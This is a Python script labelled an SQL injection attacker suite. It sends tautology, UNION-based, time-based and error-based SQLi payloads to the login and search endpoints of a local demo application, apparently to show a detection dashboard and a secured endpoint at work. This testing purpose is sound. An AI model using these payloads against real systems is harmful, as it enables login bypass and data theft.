import requests
import time

BASE_URL = "http://127.0.0.1:5000"

def test_attack(name, url, method="GET", data=None, params=None):
    print(f"\n[+] Testing: {name}")
    start_time = time.time()
    try:
        if method == "POST":
            response = requests.post(url, data=data)
        else:
            response = requests.get(url, params=params)
        
        duration = time.time() - start_time
        print(f"    Status: {response.status_code}")
        print(f"    Response Time: {duration:.2f}s")
        
        # Check for success indicators
        if "SUCCESS" in response.text or "Found" in response.text:
            print("    Result: 🟢 ATTACK SUCCESSFUL (Bypassed Security)")
        elif "Error" in response.text:
            print("    Result: 🟡 DATABASE ERROR (Potential Vulnerability)")
        else:
            print("    Result: 🔴 ATTACK FAILED")
            
    except Exception as e:
        print(f"    Error: {e}")

def run_suite():
    print("=== SQLi ATTACKER SUITE ===")
    
    # 1. Tautology Attack (Boolean-based)
    test_attack("Tautology (Login)", f"{BASE_URL}/login", "POST", 
                data={"username": "' OR 1=1 --", "password": "any"})

    # 2. Union-based Attack
    test_attack("Union-based (Search)", f"{BASE_URL}/search", "GET", 
                params={"role": "user' UNION SELECT 1, 'hacker', 'password', 'admin' --"})

    # 3. Time-based Blind SQLi
    # Note: SQLite doesn't have SLEEP() by default, but we can simulate long queries
    # or just show the detection engine catching the payload string.
    test_attack("Time-based Payload (Detection only)", f"{BASE_URL}/search", "GET", 
                params={"role": "user'; SELECT SLEEP(5); --"})

    # 4. Error-based
    test_attack("Error-based (Login)", f"{BASE_URL}/login", "POST", 
                data={"username": "admin' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, version(), 0x7e) as x FROM information_schema.tables GROUP BY x) AS y) --", "password": "any"})

    # 5. Testing Secure Endpoint (Should fail all attacks)
    test_attack("Secure Endpoint Protection", f"{BASE_URL}/secure-login", "POST", 
                data={"username": "' OR 1=1 --", "password": "any"})

    print("\n=== SUITE COMPLETE ===")
    print("Go to http://127.0.0.1:5000/dashboard to see real-time detections!")

if __name__ == "__main__":
    run_suite()
